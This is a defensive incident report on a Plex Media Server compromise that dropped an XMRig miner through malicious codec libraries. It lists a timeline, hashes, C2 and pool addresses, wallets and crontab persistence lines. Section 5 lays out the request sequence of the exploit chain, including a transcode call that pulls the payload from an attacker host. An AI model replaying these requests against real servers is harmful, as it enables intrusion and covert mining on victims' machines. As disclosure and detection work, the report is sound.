# Incident report — Plex Media Server codec-injection → XMRig Monero miner

| | |
|---|---|
| **Host** | <victim-host>, <victim-ip> (<victim-ASN>), Ubuntu 22.04.5, kernel 5.15.0-198 |
| **Software** | Plex Media Server 1.42.2.10156-f737b826c (official apt repo; `dpkg -V` clean) |
| **Compromised account** | `plex` (uid 998, nologin, no sudo) |
| **First malicious artifact** | 2026-10-26 05:21:54 UTC |
| **Detected** | 2026-10-28 ~10:05 UTC (sustained ~780 % CPU from a process named `PlexMediaScanner`) |
| **Evidence collected** | 2026-10-28 10:37–10:43 UTC, live, before any remediation |
| **Status at collection time** | Miner running (PID 3536733), connected to 185.146.232.55:443 |

All times are UTC.

## 1. Summary

The attacker caused the Plex Media Server process to write ELF shared objects named `zz<5 digits>.so` into the Plex codec directory:

`/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Codecs/46f74ab-560174306fe167a5978a79dd-linux-x86_64/`

PMS `dlopen()`s every `.so` in that folder, so each file's `.init_array` constructor runs a `/bin/sh -c` payload from its `.rodata`. The payload:
1. writes base64 XMRig configs to `/var/tmp/.pxcfg_*.b64`;
2. downloads stage 2 (`plex_deploy.sh`) from the attacker's servers, falling back through curl, wget, busybox wget and perl HTTP::Tiny;
3. installs a per-minute crontab for the `plex` user, tagged `# plex_deploy_bootstrap`.

Stage 2, which was no longer downloadable at analysis time, deployed:
- a watchdog (`/var/tmp/.pxwd.sh`) that loops a launcher (`/var/tmp/.pxagent.sh`) every 45 s;
- statically linked **XMRig 6.26.0**, stored as `/var/tmp/plexd` and disguised as `.../Plex Media Server/Cache/PlexMediaScanner`, running with 14 threads.

All four `.so` files were **mapped inside the running PMS process** (PID 3534402; see `volatile/proc/3534402/maps`). The payload therefore re-runs on every PMS start and codec load. The journal shows **799** crontab REPLACE events and **550** `NOSCRIPT` lines (stage-2 download failed) between 2026-10-26 05:22 and 2026-10-28 09:59. One re-run was observed at 09:55:52 today, about 1 s after a remote user started a transcode and the CodecManager initialised.

**Initial access vector: not determined.** The `.so` files were written by the PMS process itself, owned by plex. PMS logs rotate at 10 MB × 6 and only go back to 2026-10-28 03:52, so the requests that planted the codecs are gone. PMS listens on `*:32400`. The likely explanations are a PMS file-write vulnerability or abuse of a stolen or privileged Plex token.

## 2. Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| 2026-10-26 05:21:54 | `zz92113.so` written into the Codecs dir by plex | `timeline/files_2026-10-26_0500-0540.txt` |
| 05:22:04 | `crontab (plex) REPLACE`: first payload execution | journal |
| 05:23:01 | First cron run of `/var/tmp/pd.sh # plex_deploy_bootstrap` | `logs/system/journal_cron.txt` |
| 05:23:41 | wget HSTS entry for `d.uguu.se` (stage-2 fallback mirror) | `plexhome_.wget-hsts` |
| 05:25:40 | Miner dropped at `Cache/PlexMediaScanner` | file mtime |
| 06:22:30 | `zz95748.so` planted (proxy variant, 4 configs) | file mtime |
| 19:00:58 | `zz41257.so` planted (switches C2 to 130.94.112.197, adds TLS proxy pool) | file mtime |
| 2026-10-27 06:44:55 | `zz83494.so` planted (byte-identical to zz41257) | file mtime |
| 2026-10-27 11:19:13–15 | Current `.pxwd.sh`, `.pxagent.sh`, `.deployed` and crontab installed | file mtimes, crontab header |
| 2026-10-28 03:38 | PMS restarted; payload re-executes; miner PID 3536733 started 03:39:01 by cron | ps, journal |
| 2026-10-28 09:55:52 | Remote transcode starts → payload re-run → `.pxcfg_*` and `plex_exp_proxy.json` rewritten 09:55:53 | PMS log, file mtimes |
| 2026-10-28 10:37 | Live evidence collection | `collection.log` |

## 3. Indicators of compromise

### Files (SHA256)
| SHA256 | Name / path | Notes |
|---|---|---|
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | `/var/tmp/plexd`, `.../Cache/PlexMediaScanner` | XMRig 6.26.0, static, stripped, 8,350,992 B |
| `5a006b1059104180198e2488c54d53f048ae79acc5e67762cb308c13257c7a94` | `Codecs/.../zz92113.so` | first-wave loader (C2 .118, mirrors .222, catbox, uguu; `BADWALLET` check) |
| `edab20185f73dd8aff3dace3e552d4cc07bb16583ef7b9cdec02d81d1d1e52fe` | `Codecs/.../zz95748.so` | proxy-variant loader (C2 .118; wallet + pool check) |
| `046a9efb637f66be75f85a4748742520390382566e1c0a8b34f38ec166e39b5b` | `Codecs/.../zz41257.so`, `zz83494.so` | latest loader (C2 .197; inline TLS-proxy config) |
| `4e92a3941d33e296163482cea64f26360ec37769804f099b771cce966c2e78f5` | `/var/tmp/.pxwd.sh` | watchdog |
| `cb709bfb59999212236a32907d0bd9c52f6dfe089770af16c16716a2901b0c88` | `/var/tmp/.pxagent.sh` | launcher |
| `cd485a631406dad8e430eaebe4540ac0b97f7f574ad010bc9e9dc68998192587` | `/var/tmp/plex_exp_proxy.json` | active miner config |
| `417a11aebf68cbf37eb97dd4eaabf2286ef38a7f646c4b6d0edeabb3469b294e` | `/var/tmp/plex_exp.json` | older config (MoneroOcean + bore.pub) |

MD5/SHA1 for every sample are in `HASHES.txt`. Loader `.so` files are 1,036,800 B, export a function `go`, and their payload is in `.rodata` and run from `.init_array`.

### Network
| Indicator | Role |
|---|---|
| `130.94.112.118:18899`, `130.94.112.197:18899` | stage-2 C2 (`/plex_deploy.sh`) |
| `89.125.187.222:18899` | stage-2 C2 fallback |
| `https://files.catbox.moe/b6r6tt.sh`, `https://d.uguu.se/swTOlsRc.sh` | stage-2 mirrors (HTTP 404 on 2026-10-28) |
| `185.146.232.55:443` (TLS, fp `D2CC627EFFA8B10BE77541862C66DD9FF84B5FFC8858E3A0CB836B617A90151C`) | **active** mining proxy |
| `130.94.112.118:10002`, `130.94.112.197:10002` | mining proxy (plain stratum) |
| `139.99.69.109:10001`, `bore.pub:62571/62572/62620/62621` | pool / tunnelled proxies |
| `gulf/de/fr/fi.moneroocean.stream:10001/443` | public pool fallback |

### Wallets / identifiers
- `874yo479WPRgjWLXNyTvxmjdz3iwgMP4dD85h4hGPaB1jNAgjQx3zSzXfeZJq1uykg3x2c3HSfXYBcVYzz8fFfhPT7j7y2i` (current, proxy pass `533a0ff6f84f5a41ddf77c739b8226363918b942`)
- `8AB1pyofQxnfjU7UXcVEbXWVbSeTM3jdmXxGgKTUMYJYXJEnZvfdE1VSaZZ85LeuHf7UX6HfDoouQdFK5mfstQ23P9aCSE5` (earlier)
- rig-ids `V_serversr_d8d5`, `P_DIRECT_FALLBACK`; worker id `P_<victim-host>_<id>`

### Host artefacts
- Crontab (plex): `* * * * * /bin/sh "/var/tmp/.pxwd.sh" >/dev/null 2>&1 # plex_deploy_bootstrap`. The earlier form was `[ -f /var/tmp/.deployed ] || /bin/sh /var/tmp/pd.sh >> /var/tmp/deploy.log 2>&1 # plex_deploy_bootstrap`.
- Files: `/var/tmp/{plexd,pd.sh*,.pxwd.sh,.pxwd.pid,.pxagent.sh,.pxalive,.pxinfo,.pxlog,.pxcfg_{auto,light,proxy,proxy_light}.b64,.deployed,plex_exp.json,plex_exp_proxy.json}` and `/tmp/{.pxinfo,.deployed}`. Lock dir: `.pxdeploy.lock`.
- Env markers in the loaders: `PLEX_PROXY_ONLY=1`, `PLEX_FORCE_RESTART=1`.

## 4. Scope checks performed
- `dpkg -V plexmediaserver`: clean (the Plex binaries themselves are not modified).
- No `/etc/ld.so.preload`. No new system cron, systemd units or sudoers changes found. The only miner-sized files are the two known copies.
- `plex` is in groups `video` and `render` only. No sign of privilege escalation was found, but the root filesystem was not imaged.
- Collection was limited to the system drive, by instruction.

## 5. Addendum: live exploitation captured 2026-10-28 (PMS logs)

Three exploitation runs against the victim on 2026-10-28, from two separate sources, all using the Plex2Shell chain:

1. `GET /player/proxy/poll`, then `GET /player/timeline/subscribe?...&protocol=http://127.0.0.1:32400/system/agents/z/searchOne?...com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=...`. This is an SSRF that yields the owner token; the following requests are authenticated as the owner.
2. `GET /system/:/resources/x?resource_name=<path>`: arbitrary file read as the plex user (`Plex Transcoder`, `/proc/self/environ`, `Preferences.xml`).
3. `PUT /:/prefs?TranscoderH264Options=dump-yuv=<Codecs dir>/zz<id>.so:qp=0`.
4. `GET /video/:/transcode/universal/start.m3u8?path=http://<attacker>:<port>/item.xml`. The transcoder decodes the attacker's video into the `.so` file.
5. `GET /system/:/resources/x?resource_name=<Codecs>/zz<id>.so` to check the write, then `PUT /:/prefs?TranscoderH264Options=` to clean up.

| Time (UTC) | Source | Implant name | Notes |
|---|---|---|---|
| 06:38 | 176.65.149.174 | zz69492.so | payload video served from 176.65.149.174:40181 / :36455 |
| 08:01 | 43.108.122.170 (`43-108-122-170.sslip.io`) | zzq7x2789.so | sprays Docker (`/config/...`), Synology (`/var/packages/...`) and QNAP (`/share/CACHEDEV1_DATA/...`) paths |
| 09:10 | 176.65.149.174 | zz78638.so | |

None of the 2026-10-28 attempts produced a new implant (the read-back returned 404). The four implants in this package come from successful runs on 2026-10-26/27, which happened before the oldest log Plex still keeps. Full sanitized request lines are in `logs/attacker_requests_2026-10-28.log`.

## 6. Repository layout
See the main [README](README.md): `stages/` (stage-by-stage artefacts), `iocs/iocs.csv`, `yara/`, `check_plex2shell.sh`. Samples are on MalwareBazaar, not in this repo.
